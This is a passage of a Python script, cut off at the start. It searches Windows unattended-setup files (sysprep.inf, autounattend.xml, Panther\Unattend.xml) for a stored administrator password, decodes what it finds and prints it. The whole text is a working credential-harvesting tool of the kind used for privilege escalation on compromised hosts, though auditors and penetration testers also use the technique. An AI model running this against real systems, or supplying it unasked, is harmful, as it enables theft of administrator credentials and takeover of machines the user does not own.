                    print(f"Decoded password: {decoded_password}")
                    return decoded_password
                else:
                    print(f"Failed to decode password from {path}.")
            else:
                print(f"No password found in {path}.")
        else:
            print(f"Path does not exist: {path}")
    return None


# Main function
def main():
    possible_paths = [
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\autounattend.xml",
        r"C:\Windows\Panther\Unattend.xml"
    ]


    print("Searching for administrative password in unattended files...")
    password = check_multiple_paths_for_password(possible_paths)


    if password:
        print(f"Final decoded password: {password}")
    else:
        print("No password found in any of the paths.")


if __name__ == "__main__":
    main()
